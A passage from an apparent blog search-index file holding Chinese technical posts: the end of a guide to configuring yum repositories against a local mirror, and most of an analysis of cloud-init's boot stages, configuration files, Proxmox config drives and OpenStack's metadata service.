class=\"string\">name=CentOS - Updates</span></span><br><span class=\"line\"><span class=\"string\">baseurl=http://mirror.caogo.local/centos/updates/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#additional packages that may be useful</span></span><br><span class=\"line\"><span class=\"string\">[extras]</span></span><br><span class=\"line\"><span class=\"string\">name=CentOS - Extras</span></span><br><span class=\"line\"><span class=\"string\">baseurl=http://mirror.caogo.local/centos/extras/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#additional packages that extend functionality of existing packages</span></span><br><span class=\"line\"><span class=\"string\">[centosplus]</span></span><br><span class=\"line\"><span class=\"string\">name=CentOS - Plus</span></span><br><span class=\"line\"><span class=\"string\">baseurl=http://mirror.caogo.local/centos/centosplus/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/yum.repos.d/Caogo-Docker-CE.repo &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">[docker-ce]</span></span><br><span class=\"line\"><span class=\"string\">name=Docker CE Stable</span></span><br><span class=\"line\"><span class=\"string\">baseurl=http://mirror.caogo.local/docker-ce/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/yum.repos.d/Caogo-EPEL.repo &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">[epel]</span></span><br><span class=\"line\"><span class=\"string\">name=Extra Packages for Enterprise Linux 7</span></span><br><span class=\"line\"><span class=\"string\">baseurl=http://mirror.caogo.local/epel/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/yum.repos.d/Caogo-Kubernetes.repo &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">[kubernetes]</span></span><br><span class=\"line\"><span class=\"string\">name=kubernetes - el7-x86_64</span></span><br><span class=\"line\"><span class=\"string\">baseurl=http://mirror.caogo.local/kubernetes/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\">yum repolist</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><p>阿里云的软件源网址：<a href=\"https://developer.aliyun.com/mirror/\">https://developer.aliyun.com/mirror</a></p>\n</li>\n<li><p>腾讯云的软件源网址：<a href=\"https://mirrors.cloud.tencent.com/\">https://mirrors.cloud.tencent.com</a></p>\n</li>\n<li><p>华为云的软件源网址：<a href=\"https://mirrors.huaweicloud.com/\">https://mirrors.huaweicloud.com</a></p>\n</li>\n<li><p><a href=\"https://xy2401.com/local-docs/gnu/manual.zh/wget.html\">Wget 1.20手册</a></p>\n</li>\n</ul>\n"},{"title":"虚拟机管理软件cloud-init技术分析","url":"/2023/09/10/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6cloud-init%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>cloud-init 最初由 ubuntu 的母公司 Canonical 开发，基本设计思路是：</p>\n<ul>\n<li>当用户首次创建虚拟机时，将前台设置的主机名，密码或者秘钥等存入后台的元数据服务器 - metadata server</li>\n<li>当 cloud-init 随虚拟机启动而运行时，通过 http 协议访问 metadata server</li>\n<li>虚拟机根据预设的元数据信息修改主机配置，从而完成系统的环境初始化</li>\n</ul>\n<p>目前大部分公有云（openstack, AWS, Aliyun）都在使用 cloud-init , 已经成为事实的工业标准。<br>开源代码： <a href=\"https://github.com/cloud-init/cloud-init\">https://github.com/cloud-init/cloud-init</a><br>官方文档： <a href=\"https://cloudinit.readthedocs.io/en/latest/\">https://cloudinit.readthedocs.io/en/latest/</a></p>\n<p>cloud-init 基于 Python 开发，可以通过<code>yum install cloud-init</code>进行安装，此外还有2个辅助软件包，<code>cloud-utils-growpart</code>用于磁盘空间自动扩容，<code>cloud-utils</code>用于镜像格式转换等。</p>\n<ul>\n<li>程序入口：<code>/usr/bin/cloud-init</code></li>\n<li>代码安装目录：<code>/usr/lib/python2.7/site-packages/cloudinit/</code></li>\n<li>核心配置文件：<code>/etc/cloud/cloud.cfg</code></li>\n<li>日志文件位于：<code>/var/log/cloud-init.log</code></li>\n<li>模版文件目录：<code>/etc/cloud/templates/</code></li>\n<li>缓存数据位于：<code>/var/lib/cloud/</code></li>\n<li>系统服务目录：<code>/usr/lib/systemd/system/</code></li>\n</ul>\n<p>本文以 centos7.8 + cloud-init 19.4 为例，分析其工作原理和实现方式。</p>\n<blockquote>\n<p>cloud-init 版本从 0.7.9 突变为 17.1，最新版本为 23.3.1，测试版本为 19.4.0<br>早期版本基于 Python2.7 开发，后来改为 Python3，因此代码安装目录可能有变化</p>\n</blockquote>\n<h2 id=\"二、工作原理\"><a href=\"#二、工作原理\" class=\"headerlink\" title=\"二、工作原理\"></a>二、工作原理</h2><p>cloud-init 对系统的初始化分为四个阶段，分别是：local、init、config、final。<br>一般通过 systemd 进行管理，通过命令<code>systemctl list-unit-files |grep cloud</code>，可以列出四个阶段对应的 cloud-init-local、cloud-init、cloud-config、cloud-final 等4个 service 文件。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">cloud-config.service                          enabled </span><br><span class=\"line\">cloud-final.service                           enabled </span><br><span class=\"line\">cloud-init-local.service                      enabled </span><br><span class=\"line\">cloud-init.service                            enabled </span><br><span class=\"line\">cloud-config.target                           static  </span><br><span class=\"line\">cloud-init.target                             static </span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>.target 是静态定义，一般只有描述服务之间依赖关系的 Unit 段，不包含执行命令</p>\n</blockquote>\n<p>systemd 服务启动时会有一个简单的 generator stage，其任务是检查系统状态检查，并读取主配置文件<code>cloud.cfg</code>。<br>如果满足以下情况，cloud-init 将不在开机时启动，本组内其他 service 也遵循该规则：</p>\n<ul>\n<li><code>/etc/cloud/cloud-init.disabled</code> 文件存在时</li>\n<li>当内核命令发现文件 <code>/proc/cmdline</code>包含 <code>cloud-init=disabled</code>时</li>\n</ul>\n<blockquote>\n<p>当在容器中运行时，内核命令可能会被忽略，但是 cloud-init 会读取<code>KERNEL_CMDLINE</code>环境变量</p>\n</blockquote>\n<h3 id=\"1-Local-Stage\"><a href=\"#1-Local-Stage\" class=\"headerlink\" title=\"1. Local Stage\"></a>1. Local Stage</h3><p>作为虚拟机实例启动 cloud-init 的第一个阶段，其任务是：查找<strong>本地</strong>数据源，并应用于网络配置！<br>分析 systemd 配置文件<code>cloud-init-local.service</code>，发现：</p>\n<ul>\n<li>依赖于 systemd-remount-fs.service，即需要加载 root 文件系统</li>\n<li>检查是否存在缓存文件目录<code>/var/lib/cloud</code></li>\n<li>核心执行代码：<code>/usr/bin/cloud-init init --local</code></li>\n</ul>\n<p>所谓本地数据源，有以下几种方式：</p>\n<ul>\n<li>datasource：本机的config drive（例如 PVE 的Cloud-init CDROM），或者 Openstack、EC2 提供的云网络配置</li>\n<li>fallback：默认方式，相当于<code>dhcp on eth0</code>，即直接通过 DHCP 服务获得网络配置信息</li>\n<li>none：禁用网络。可以通过在<code>/etc/cloud/cloud.cfg</code>中，添加内容<code>network: &#123;config: disabled&#125;</code>实现</li>\n</ul>\n<blockquote>\n<p>所支持的数据源定义位于：<code>/usr/lib/python2.7/site-packages/cloudinit/settings.py</code>中的变量<code>CFG_BUILTIN.datasource_list</code></p>\n</blockquote>\n<p>如果是该实例的第一次启动，那么被选中的网络配置会被应用，所有老旧的配置都会会清除。<br>该阶段需要阻止网络服务启动以及老的配置被应用，这可能带来一些负面的影响，比如 DHCP 服务挂起，或者已经广播了老的 hostname，这可能导致系统进入一个奇怪的状态需要重启网络设备。</p>\n<h3 id=\"2-Init-Stage\"><a href=\"#2-Init-Stage\" class=\"headerlink\" title=\"2. Init Stage\"></a>2. Init Stage</h3><p>在官方文档中，也称为 Network Stage。<br>分析 systemd 配置文件<code>cloud-init.service</code>，发现：</p>\n<ul>\n<li>依赖于 cloud-init-local.service 和 NetworkManager.service</li>\n<li>核心执行代码：<code>/usr/bin/cloud-init init</code></li>\n</ul>\n<p>此阶段运行核心配置文件中名为<code>cloud_init_modules下</code>的所有module，主要包括：</p>\n<ul>\n<li>文件系统配置：包括 disk_setup 、resizefs、growpart 等<br>由于 nfs 等依赖于网络配置，这些模块不能过早启动。</li>\n<li>主机网络配置：包括 set_hostname、update_hostname、update_etc_hosts等</li>\n<li>辅助功能实现：包括 migrator、bootcmd、write-files、rsyslog、user-groups、ssh等</li>\n</ul>\n<h3 id=\"3-Config-Stage\"><a href=\"#3-Config-Stage\" class=\"headerlink\" title=\"3. Config Stage\"></a>3. Config Stage</h3><p>分析 systemd 配置文件<code>cloud-config.service</code>和<code>cloud-config.target</code>，发现：</p>\n<ul>\n<li>依赖于 cloud-init-local.service 和 cloud-init.service</li>\n<li>核心执行代码：<code>/usr/bin/cloud-init modules --mode=config</code></li>\n</ul>\n<p>此阶段运行核心配置文件中名为<code>cloud_config_modules下</code>的所有module，主要包括：</p>\n<ul>\n<li>文件系统挂载：包括 mounts 等</li>\n<li>主机环境配置：包括 locale、timezone、set-password、rh_subscription等</li>\n<li>系统软件处理：包括 yum-add-repo、package-update-upgrade-install</li>\n<li>辅助功能实现：包括 runcmd、puppet等</li>\n</ul>\n<h3 id=\"4-Final-Stage\"><a href=\"#4-Final-Stage\" class=\"headerlink\" title=\"4. Final Stage\"></a>4. Final Stage</h3><p>分析 systemd 配置文件<code>cloud-final.service</code>，发现：</p>\n<ul>\n<li>依赖于 cloud-config.service</li>\n<li>核心执行代码：<code>/usr/bin/cloud-init modules --mode=final</code></li>\n</ul>\n<p>此阶段运行核心配置文件中名为<code>cloud_final_modules下</code>的所有module，主要包括：</p>\n<ul>\n<li>用户脚本处理：包括 scripts-per-once、scripts-per-boot、scripts-per-instance、scripts-user 等</li>\n<li>用户登录配置：包括 ssh-authkey-fingerprints、keys-to-console等</li>\n<li>系统软件处理：包括 yum-add-repo、package-update-upgrade-install</li>\n<li>辅助功能实现：包括 final-message、phone-home等</li>\n</ul>\n<h3 id=\"5-cloud-cfg-示例\"><a href=\"#5-cloud-cfg-示例\" class=\"headerlink\" title=\"5. cloud.cfg 示例\"></a>5. cloud.cfg 示例</h3><figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">users:</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">default</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">disable_root:</span> <span class=\"number\">1</span>                             <span class=\"comment\"># 禁止root登录，默认true，一般需修改！</span></span><br><span class=\"line\"><span class=\"attr\">ssh_pwauth:</span>   <span class=\"number\">0</span>                             <span class=\"comment\"># 允许密码登录，默认false，一般需修改！</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">mount_default_fields:</span> [<span class=\"string\">~</span>, <span class=\"string\">~</span>, <span class=\"string\">&#x27;auto&#x27;</span>, <span class=\"string\">&#x27;defaults,nofail,x-systemd.requires=cloud-init.service&#x27;</span>, <span class=\"string\">&#x27;0&#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>]</span><br><span class=\"line\"><span class=\"attr\">resize_rootfs_tmp:</span> <span class=\"string\">/dev</span></span><br><span class=\"line\"><span class=\"attr\">ssh_deletekeys:</span>   <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"attr\">ssh_genkeytypes:</span>  <span class=\"string\">~</span></span><br><span class=\"line\"><span class=\"attr\">syslog_fix_perms:</span> <span class=\"string\">~</span></span><br><span class=\"line\"><span class=\"attr\">disable_vmware_customization:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">cloud_init_modules:</span>                         <span class=\"comment\"># 定义init阶段需要执行的模块</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">disk_setup</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">migrator</span>                                 <span class=\"comment\"># 迁移老的cloud-init数据</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">bootcmd</span>                                  <span class=\"comment\"># 启动时执行相关命令</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">write-files</span>                              <span class=\"comment\"># 根据cloud.cfg的配置写数据到文件里</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">growpart</span>                                 <span class=\"comment\"># 扩展分区到硬盘的大小 ，默认对根分区执行。需要调用 growpart ！</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">resizefs</span>                                 <span class=\"comment\"># resize文件系统，适配新的大小。默认对根目录执行</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">set_hostname</span>                             <span class=\"comment\"># 根据元数据设置主机名</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">update_hostname</span>                          <span class=\"comment\"># 更新主机名，适用于当用户自定义主机名时</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">update_etc_hosts</span>                         <span class=\"comment\"># 更新 /etc/hosts</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">rsyslog</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">users-groups</span>                             <span class=\"comment\"># 根据cloud.cfg的配置创建用户组和用户</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">ssh</span>                                      <span class=\"comment\"># 配置sshd</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">cloud_config_modules:</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">mounts</span>                                   <span class=\"comment\"># 加载自定义的磁盘，/etc/fstab ？</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">locale</span>                                   <span class=\"comment\"># 设置语言</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">set-passwords</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">rh_subscription</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">yum-add-repo</span>                             <span class=\"comment\"># 添加自定义 YUM 源，好像只能加1个？</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">package-update-upgrade-install</span>           <span class=\"comment\"># 安装完成后自动升级软件包，一般需关闭！</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">timezone</span>                                 <span class=\"comment\"># 设置时区</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">puppet</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">chef</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">salt-minion</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">mcollective</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">disable-ec2-metadata</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">runcmd</span>                                   <span class=\"comment\"># 执行自定义的命令行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">cloud_final_modules:</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">rightscale_userdata</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">scripts-per-once</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">scripts-per-boot</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">scripts-per-instance</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">scripts-user</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">ssh-authkey-fingerprints</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">keys-to-console</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">phone-home</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">final-message</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">power-state-change</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">system_info:</span></span><br><span class=\"line\">  <span class=\"attr\">default_user:</span>                             <span class=\"comment\"># 自动创建默认用户，可修改！</span></span><br><span class=\"line\">    <span class=\"attr\">name:</span> <span class=\"string\">centos</span></span><br><span class=\"line\">    <span class=\"attr\">lock_passwd:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"attr\">gecos:</span> <span class=\"string\">Cloud</span> <span class=\"string\">User</span></span><br><span class=\"line\">    <span class=\"attr\">groups:</span> [<span class=\"string\">adm</span>, <span class=\"string\">systemd-journal</span>]</span><br><span class=\"line\">    <span class=\"attr\">sudo:</span> [<span class=\"string\">&quot;ALL=(ALL) NOPASSWD:ALL&quot;</span>]</span><br><span class=\"line\">    <span class=\"attr\">shell:</span> <span class=\"string\">/bin/bash</span></span><br><span class=\"line\">  <span class=\"attr\">distro:</span> <span class=\"string\">rhel</span>                              <span class=\"comment\"># Linux发行版类型是 redhat</span></span><br><span class=\"line\">  <span class=\"attr\">paths:</span></span><br><span class=\"line\">    <span class=\"attr\">cloud_dir:</span> <span class=\"string\">/var/lib/cloud</span>               <span class=\"comment\"># 缓存数据目录</span></span><br><span class=\"line\">    <span class=\"attr\">templates_dir:</span> <span class=\"string\">/etc/cloud/templates</span>     <span class=\"comment\"># 模版文件目录</span></span><br><span class=\"line\">  <span class=\"attr\">ssh_svcname:</span> <span class=\"string\">sshd</span></span><br></pre></td></tr></table></figure>\n\n<p>官方文档提供了配置文件的自定义规则方法，参见<a href=\"https://cloudinit.readthedocs.io/en/latest/reference/examples.html\">Cloud config examples</a></p>\n<h2 id=\"三、PVE-的-config-drive-实现\"><a href=\"#三、PVE-的-config-drive-实现\" class=\"headerlink\" title=\"三、PVE 的 config drive 实现\"></a>三、PVE 的 config drive 实现</h2><p>Config drive 机制是将 metadata 信息写入虚拟机的一个特殊的配置设备（例如 CDROM ）中，然后在虚拟机启动时，自动挂载并读取 metadata 信息，从而达到获取 metadata 的目的。</p>\n<blockquote>\n<p>光盘作为存储介质，也需要安装特定的文件系统来管理数据和文件，这就是 <a href=\"https://www.iso.org/obp/ui/#iso:std:iso:9660:ed-1:v1:en\">ISO 9660</a>，别名是 CDFS</p>\n</blockquote>\n<p>PVE 的虚拟机模版通过增加一个专用的 Cloud-init CDROM 设备实现 config drive。</p>\n<p>例如，我们从前台界面配置了 一个虚拟机 VM 511。<br><img src=\"/2023/09/10/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6cloud-init%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/pve-cloudinit.png\" alt=\"PVE\"></p>\n<p>第一步，将配置信息存储在<code>/etc/pve/qemu-server/511.conf</code>，内容是：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">agent:</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"attr\">bootdisk:</span> <span class=\"string\">scsi0</span></span><br><span class=\"line\"><span class=\"attr\">cores:</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"attr\">ide2:</span> <span class=\"string\">local-lvm:vm-511-cloudinit,media=cdrom</span></span><br><span class=\"line\"><span class=\"attr\">ipconfig0:</span> <span class=\"string\">ip=192.168.0.223/24,gw=192.168.0.8</span></span><br><span class=\"line\"><span class=\"attr\">memory:</span> <span class=\"number\">1024</span></span><br><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">cloud-init</span></span><br><span class=\"line\"><span class=\"attr\">nameserver:</span> <span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.144</span></span><br><span class=\"line\"><span class=\"attr\">net0:</span> <span class=\"string\">virtio=DA:41:A4:42:9C:DB,bridge=vmbr0,firewall=1</span></span><br><span class=\"line\"><span class=\"attr\">numa:</span> <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"attr\">ostype:</span> <span class=\"string\">l26</span></span><br><span class=\"line\"><span class=\"attr\">scsi0:</span> <span class=\"string\">local-lvm:vm-511-disk-0,size=10G</span></span><br><span class=\"line\"><span class=\"attr\">scsihw:</span> <span class=\"string\">virtio-scsi-pci</span></span><br><span class=\"line\"><span class=\"attr\">searchdomain:</span> <span class=\"string\">caogo.local3</span></span><br><span class=\"line\"><span class=\"attr\">smbios1:</span> <span class=\"string\">uuid=5584c7ed-76f4-4b6d-a6fe-cb10a8b220fc</span></span><br><span class=\"line\"><span class=\"attr\">sockets:</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"attr\">vmgenid:</span> <span class=\"string\">297abc09-fa0f-46b0-b9ad-ae3195110f2a</span></span><br></pre></td></tr></table></figure>\n\n<p>第二步，PVE 控制台将 VM 相关的 metadata 信息写入 libvirt 的虚拟磁盘文件中，并指示 libvirt 将其虚拟为 cdrom 设备。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@nuc5i3:/dev/pve# ls -l /dev/pve/vm-511-cloudinit</span><br><span class=\"line\">lrwxrwxrwx 1 root root 8 Sep 17 23:11 /dev/pve/vm-511-cloudinit -&gt; ../dm-24</span><br></pre></td></tr></table></figure>\n\n<p>这样，当该虚拟机启动时，Guest 操作系统中的 cloud-init 会去挂载该 cloud-init 设备，然后根据所读取出的内容对虚拟机进行配置。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@copy-of-vm-centos7 ~]# mount /dev/sr0 /mnt</span><br><span class=\"line\">mount: /dev/sr0 写保护，将以只读方式挂载</span><br><span class=\"line\">[root@copy-of-vm-centos7 ~]# ls -l /mnt</span><br><span class=\"line\">总用量 2</span><br><span class=\"line\">-rw-r--r--. 1 root root  54 9月  17 12:08 meta-data</span><br><span class=\"line\">-rw-r--r--. 1 root root 227 9月  17 12:08 network-config</span><br><span class=\"line\">-rw-r--r--. 1 root root 170 9月  17 12:08 user-data</span><br></pre></td></tr></table></figure>\n\n<p>第三步，虚拟机启动 cloud-init 时，将读取<code>/dev/sr0</code>的全部文件并加载到缓存。</p>\n<p>cloud-init 支持四种配置文件，其中：</p>\n<ul>\n<li><code>meta-data</code>（必须）: 一般是 instance id，唯一的一个机器标识符</li>\n<li><code>network-config</code>: 关于网络如 ip、nameserver、dns等的定义</li>\n<li><code>user-data</code>（可选）: 我们定义的大多数配置都放在这里</li>\n<li><code>vendor-data</code>（可选）: 是供应商（云）定义的如 user-data 类似数据，如果定义为 NoCloud 时该文件不存在</li>\n</ul>\n<h3 id=\"元数据配置文件：meta-data\"><a href=\"#元数据配置文件：meta-data\" class=\"headerlink\" title=\"元数据配置文件：meta-data\"></a>元数据配置文件：meta-data</h3><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 定义了一个实例instance，并设置了唯一ID</span></span><br><span class=\"line\"><span class=\"attr\">instance-id:</span> <span class=\"string\">5be815eb6375dae4bfdd91471def3f8415521f1d</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"网络配置文件：network-config\"><a href=\"#网络配置文件：network-config\" class=\"headerlink\" title=\"网络配置文件：network-config\"></a>网络配置文件：network-config</h3><figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"attr\">config:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">type:</span> <span class=\"string\">physical</span></span><br><span class=\"line\">      <span class=\"attr\">name:</span> <span class=\"string\">eth0</span></span><br><span class=\"line\">      <span class=\"attr\">mac_address:</span> <span class=\"string\">&#x27;da:41:a4:42:9c:db&#x27;</span></span><br><span class=\"line\">      <span class=\"attr\">subnets:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">type:</span> <span class=\"string\">static</span></span><br><span class=\"line\">        <span class=\"attr\">address:</span> <span class=\"string\">&#x27;192.168.0.223&#x27;</span></span><br><span class=\"line\">        <span class=\"attr\">netmask:</span> <span class=\"string\">&#x27;255.255.255.0&#x27;</span></span><br><span class=\"line\">        <span class=\"attr\">gateway:</span> <span class=\"string\">&#x27;192.168.0.8&#x27;</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">type:</span> <span class=\"string\">nameserver</span></span><br><span class=\"line\">      <span class=\"attr\">address:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&#x27;192.168.0.144&#x27;</span></span><br><span class=\"line\">      <span class=\"attr\">search:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&#x27;caogo.local3&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"用户数据文件：user-data\"><a href=\"#用户数据文件：user-data\" class=\"headerlink\" title=\"用户数据文件：user-data\"></a>用户数据文件：user-data</h3><figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 定义了大多数配置信息</span></span><br><span class=\"line\"><span class=\"attr\">hostname:</span> <span class=\"string\">cloud-init</span></span><br><span class=\"line\"><span class=\"attr\">manage_etc_hosts:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 完全合格域名 FQDN (Fully Qualified Domain Name)是一个包含了主机名和域名的完整标识符</span></span><br><span class=\"line\"><span class=\"attr\">fqdn:</span> <span class=\"string\">cloud-init.caogo.local3</span></span><br><span class=\"line\"><span class=\"attr\">chpasswd:</span></span><br><span class=\"line\">  <span class=\"attr\">expire:</span> <span class=\"literal\">False</span></span><br><span class=\"line\"><span class=\"attr\">users:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"string\">default</span></span><br><span class=\"line\"><span class=\"attr\">package_upgrade:</span> <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、openStack-的-Metadata-RESTful-服务机制\"><a href=\"#四、openStack-的-Metadata-RESTful-服务机制\" class=\"headerlink\" title=\"四、openStack 的 Metadata RESTful 服务机制\"></a>四、openStack 的 Metadata RESTful 服务机制</h2><p>OpenStack 提供了 RESTful 接口，虚拟机可以通过 REST API 来获取 metadata 信息，具体包含了三个服务组件，其中<code>Nova-api-metadata</code>运行在云平台的控制节点，<code>neutron-metadata-agent</code>和<code>Neutron-ns-metadata-proxy</code>运行在网络节点，分别位于 openstack 管理网络和 租户所在的用户网络。</p>\n<p><img src=\"/2023/09/10/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6cloud-init%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/nova.jpg\" alt=\"nova\"></p>\n<p>首先要解决一个问题，在虚拟机尚未配置网络的情况下，往哪里发送 REST API 请求呢？<br>最早由亚马逊公司提出了 metadata 方案，利用 IPv4 保留的本地链路地址段，规定服务地址为 <code>169.254.169.254:80</code>，后来 OpenStack 沿用了这一规定。</p>\n<blockquote>\n<p>Link Local Address 遵循<a href=\"https://datatracker.ietf.org/doc/html/rfc3927\">RFC 3927标准</a>，地址范围是：169.254.0.0&#x2F;16</p>\n</blockquote>\n<p>在具体实现上，Neutron 有两种方式：</p>\n<ul>\n<li>通过 router 发送请求<br>如果虚拟机所在 subnet 连接在了 router 上，那么发向 169.254.169.254 的报文会被发至 router，而 neutron-ns-metadata-proxy 就监听着该端口</li>\n<li>通过 DHCP 发送请求<br>通过 DHCP 协议的选项 121 来为虚拟机设置静态路由，此时虚拟机所在 subnet 不需连接任何 router。此方式更为常见！！！</li>\n</ul>\n<p>虚拟机获取 metadata 的大致流程为：<br><img src=\"/2023/09/10/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6cloud-init%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/workflow.png\" alt=\"workflow\"></p>\n<ol>\n<li>首先，请求被发送至<code>neutron-ns-metadata-proxy</code>，此时会在请求中添加<code>X-Neutron-Router-ID</code>和<code>X-Neutron-Network-ID</code>信息。</li>\n<li>该请求通过 unix domian socket 被转发给 <code>neutron-metadata-agent</code>。</li>\n<li><code>neutron-metadata-agent</code>根据请求中的 router-id、network-id 和 IP，获取 port 信息，从而拿到 instance-id 和 tenant-id 